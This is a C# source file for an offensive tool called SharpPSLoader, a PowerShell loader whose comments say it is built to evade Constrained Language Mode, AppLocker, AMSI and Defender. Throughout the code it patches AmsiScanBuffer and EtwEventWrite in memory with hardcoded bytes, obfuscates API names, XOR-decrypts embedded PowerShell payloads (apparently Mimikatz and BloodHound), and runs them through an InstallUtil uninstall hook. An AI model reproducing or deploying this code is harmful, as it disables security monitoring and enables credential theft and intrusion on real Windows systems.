using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;


/*
 * Add reference to c:\windows\assembly\gac_msil\system.management.automation\1.0.0.0\<~>\system.management.automation.dll  and configuration.install 
 * 
 * "Any CPU" --> installutils works, running assembly through main() fail. 
 * "x64" --> installutils works, running assembly through main() works.
 * 
 * C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U <test.exe>
 * 
 *  * Goal: 
 *  - Create a powershell loader from .NET which can bypass CLM, Applocker, AMSI, and Defender 
 *      - CLM = Through custom powershell runspace (powerpick technique)
 *      - Applocker = Through lolbas such as InstallUtil and rundll32
 *      - AMSI = Through .NET (.net amsi is a thing though) 
 *      - Defender = Bypassing defender ain't that hard 
 *      
 *      
 * Adding Resources 
 *  - Project > Properties > Add Resources > Access Modifier = Public 
 *  - And simply access it like... var thingy = Properties.Resources.<resource-name>
 *      - Returns "type" by default. ex) .txt file ==> string, byte file ==> byte[] 
 * 
 * TODO: 
 *  - Finish parsing user arguments (payload type + additional argument) 
 *  - Finish implementing everything to installutils section 
 *  - Embed more powershell scripts
 *  - cleanup the code - it's a mess rn + remove readline()
 *  
 *  
 *  (stretch)
 *  - DInvoke or peb parsing 
 *     
 * 
 * */

/*
 * 1. parseresources --> <string, byte[]> (currently encrypted) 
 * 2. decryptedPSFromRsrcDict --> string (decrypted) 
 * 3. RunPowershell 
 * */

namespace SharpPSLoader
{
    // helper function 
/*    public static bool ContainsAny(this string haystack, params string[] needles)
    {
        foreach (string needle in needles)
        {
            if (haystack.Contains(needle))
                return true;
        }

        return false;
    }*/

    public class SharpPSLoader
    {

        public Dictionary<string, byte[]> resourceDict = ParseResources();

        /// <summary>
        /// XOR Decrypt powershell byte array payload with key and return raw powershell payload 
        /// </summary>
        /// <param name="payload"></param>
        /// <param name="singleByteKey"></param>
        /// <returns>resultStr, powershell string</returns>
        public static string DecryptAndStringReturn(byte[] payload, byte singleByteKey = 0x6f)
        {
            byte[] result = new byte[payload.Length];
            for(int i = 0; i < payload.Length; i++)
            {
                result[i] = (byte)(payload[i] ^ singleByteKey);
            }

            var resultStr = Encoding.UTF8.GetString(result);

            return resultStr;
        }

        // Return a dictionary of <string,byte[]>
        // https://stackoverflow.com/questions/1310812/how-can-i-find-all-the-members-of-a-properties-resources-in-c-sharp
        /// <summary>
        /// Parse resources from assembly and create a dictionary of <string, byte[]> where string = Name, byte[] = Encrypted powershell payload.
        /// </summary>
        /// <returns>resourceDict</returns>
        public static Dictionary<string, byte[]> ParseResources()
        {
            Dictionary<string, byte[]> resourceDict = new Dictionary<string, byte[]>();

            // https://stackoverflow.com/questions/1310812/how-can-i-find-all-the-members-of-a-properties-resources-in-c-sharp
            List<string> resourceNames = new List<string>();
            foreach (PropertyInfo property in (typeof(Properties.Resources).GetProperties
                (BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)).Skip(2))  // Skip ResourceManager and Culture - hardcoding ftw 
            {
                resourceDict[property.Name] = (byte[])(property.GetValue(null, null));
            }
            return resourceDict;
        }

        // public byte[] ByteArrayFromRsrcDict(dictionary<string,byte[]> resourceDict) { ~switch, return byte[] } 
        // make resourceDict into a member variable? not sure. 
        /// <summary>
        /// Decrypt powershell payload from the resources dictioanry and return the raw powershell payload 
        /// </summary>
        /// <param name="resourceDict"></param>
        /// <param name="payload"></param>
        /// <returns>decPowershell</returns>
        public string DecryptedPSFromRsrcDict(Dictionary<string,byte[]> resourceDict, string payload)
        {
            // 1. Return encrypted powershell payload byte array 
            byte[] encPayload = Array.Empty<byte>();

#if DEBUG
            Console.WriteLine("[+] payload = {0}", payload);
#endif
            switch (payload.Trim())
            {
                case "1":
                    encPayload = resourceDict.Where(a => a.Key.Contains("mika")).Select(a => a.Value).First();
                    break;
                case "2":
                    encPayload = resourceDict.Where(a => a.Key.Contains("oodHo")).Select(a => a.Value).First();
                    break;
                default:
                    break;
            }

            // 2. Decrypt the byte array, and return the raw powershell payload 
            string decPowershell = DecryptAndStringReturn(encPayload);

            return decPowershell;
        }

        public static string ParseFunctionName(string payload)
        {
            var lines = payload.Split(new string[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
            string functionName = "";
            foreach (var line in lines)
            {
                //Console.WriteLine(line);
                if (line.ToLower().Contains("function"))
                {
                    functionName = line.Split(' ')[1].Trim().Replace("{","");
                    break;
                }
            }

            return functionName;
        }

        public static bool is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        // Return required bytes for patching 
        public static byte[] GetPatchBytes(string function)
        {
            byte[] patch;
            List<byte> patchList = new List<byte>();
            if (function.ToLower() == "bypasstw")
            {
                if (is64Bit)
                {
                    patch = new byte[2];
                    patch[0] = 0xc3;
                    patch[1] = 0x00;
                }
                else
                {
                    patch = new byte[3];
                    patch[0] = 0xc2;
                    patch[1] = 0x14;
                    patch[2] = 0x00;
                }

                // Returning for bypassEtw 
                return patch;
            }

            else if (function.ToLower() == "bypasssi")
            {

                if (is64Bit)
                {
                    patchList = new List<byte>();
                    patchList.Add(0xB8);
                    patchList.Add(0x90);
                    patchList.Add(0x57);
                    patchList.Add(0x00);
                    patchList.Add(0x07);
                    patchList.Add(0x90);
                    patchList.Add(0x80);
                    patchList.Add(0xC3);
                    patchList.RemoveAll(b => b == 0x90);
                }
                else
                {
                    patchList = new List<byte>();
                    patchList.Add(0xB8);
                    patchList.Add(0x90);
                    patchList.Add(0x57);
                    patchList.Add(0x00);
                    patchList.Add(0x07);
                    patchList.Add(0x90);
                    patchList.Add(0x80);
                    patchList.Add(0xC2);
                    patchList.Add(0x90);
                    patchList.Add(0x18);
                    patchList.Add(0x00);
                    patchList.RemoveAll(b => b == 0x90);
                }

                var patchArr = patchList.ToArray();
                return patchArr;
            }

            else
            {
                throw new ArgumentException("[-] Incorrect function name argument");
            }
        }


        // TODO: Create helper function that does basic string replace? 
        public void bypassTW()
        {
            string susLibraryZ = "nZtZdZlZlZ.dZlZlZ";
            string magicFunctionZ = "EZZtZwZEZvZeZnZtZWZrZiZtZe";
            string susLibrary = susLibraryZ.Replace("Z", "");
            string magicFunction = magicFunctionZ.Replace("Z", "");

            IntPtr ntdllAddr = LoadLibrary(susLibrary);
            IntPtr etwWriteEventAddr = GetProcAddress(ntdllAddr, magicFunction);

            byte[] magicVoodoo = GetPatchBytes("bypasstw");

            // out uint oldProtect is a nice trick, never knew that 
            VirtualProtect(etwWriteEventAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, etwWriteEventAddr, magicVoodoo.Length);
            VirtualProtect(etwWriteEventAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);

#if DEBUG
            Console.WriteLine("[+] Disabled ETW Tracing");
#endif
        }

        public void bypassSI()
        {
            string amsidllZ = "Za" + "mZsZi" + "Z.ZdZ" + "Zll";
            string amsiScanBufferZ = "AZm" + "siSZZc" + "aZnZB" + "uZfZfZer";

            string amsiDll = amsidllZ.Replace("Z", "");
            string amsiScanBuffer = amsiScanBufferZ.Replace("Z", "");

            IntPtr amsidllAddr = LoadLibrary(amsiDll);
            IntPtr amsiScanBufferAddr = GetProcAddress(amsidllAddr, amsiScanBuffer);

            byte[] magicVoodoo = GetPatchBytes("bypasssi");

            VirtualProtect(amsiScanBufferAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, amsiScanBufferAddr, magicVoodoo.Length);
            VirtualProtect(amsiScanBufferAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);

#if DEBUG
            Console.WriteLine("[+] Disabled AMSI");
#endif
        }

        public void RunPowershell(string payload, string argument = "")
        {
            argument = argument.TrimStart();
#if DEBUG
            Console.WriteLine("[+] User argument = {0}", argument);
#endif
            string cmd = payload;

            // Parse for "function" and retrieve the function name here and add to cmd 
            // Why parse functionName? Because simply typing "Invoke-Mimikatz -DumpCred" will trigger amsi. 
            string functionName = ParseFunctionName(cmd);

            // If script has a single invoke-<XYZ> functionName, add that at the end of the script 
            var requireFunctionName = new[] { "mikat", "loodhou" };
            bool boolFunctionName = requireFunctionName.Any(s => functionName.ToLower().Contains(s));

            if (!string.IsNullOrEmpty(argument) && boolFunctionName)
            {
                Console.WriteLine(functionName);
                cmd += ";";
                cmd += functionName;
                cmd += " ";
                cmd += argument;
            }
            else
            {
                cmd += "; ";
                cmd += argument;
            }

#if DEBUG
            //Console.WriteLine(cmd);
#endif

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            var results = ps.Invoke();

            // Result is 0, powershell errored out. 
            if(results.Count == 0)
            {
                Console.WriteLine("[-] Powershell returned error");
                return;
            }

            // Result is not 0, at least something returned. Write all output and yeet out. 
            foreach(var obj in results)
            {
                if (obj != null)
                { 
                    Console.WriteLine(obj.BaseObject.ToString());
                }
            }

            rs.Close();
        }

        // Empty constructor for now 
        public SharpPSLoader()
        {
            
        }
       

        public static void Main(string[] args)
        {
            Console.WriteLine("[+] Starting from main! ");


            SharpPSLoader psLoader = new SharpPSLoader();
            psLoader.bypassSI();
            psLoader.bypassTW();
            //Console.ReadLine();

            // Parse argument 
            string powershellPayload = "";
            if (args[0] != null)
            {
                powershellPayload = psLoader.DecryptedPSFromRsrcDict(psLoader.resourceDict, args[0]);
            }

            string argument = String.Join(" ", args.Skip(1));
            Console.WriteLine(argument);
            psLoader.RunPowershell(powershellPayload, argument);

            // Remove me later! 
            Console.ReadLine();
        }


        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
        string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);


    }

    
    /*
     * 1. Parse payload type (1~5) 
     * 2. Retrieve payload from the resources section 
     * 3. Single XOR decrypt using "111" hardcoded key 
     * 4. Invoke it
     * */
    [System.ComponentModel.RunInstaller(true)]
    public class Sample: System.Configuration.Install.Installer
    {
        SharpPSLoader psLoader = new SharpPSLoader();


        // Mimikatz doesn't work, but bloodhound does...? 
        /// <summary>
        /// 
        /// </summary>
        /// <param name="savedState"></param>
        public override void Uninstall(IDictionary savedState)
        {
            Console.WriteLine("hello, world!");
            //var psPayload = this.Context.Parameters["p"];
            //Console.WriteLine(psPayload.ToString());
            SharpPSLoader psLoader = new SharpPSLoader();

            // Are these two needed, when I'm executing through cmd + lolbas? 
            psLoader.bypassSI();
            psLoader.bypassTW();

            // Parse argument 
            var userArg = this.Context.Parameters["p"];
            string payload = userArg.Split(' ')[0];
            int spaceIndex = userArg.IndexOf(' ');
            string argument = userArg.Substring(spaceIndex, userArg.Length - 1);

            string powershellPayload = "";
            if (payload != null)
            {
                powershellPayload = psLoader.DecryptedPSFromRsrcDict(psLoader.resourceDict, payload);
            }

            psLoader.RunPowershell(powershellPayload, argument);

        }
    }


}

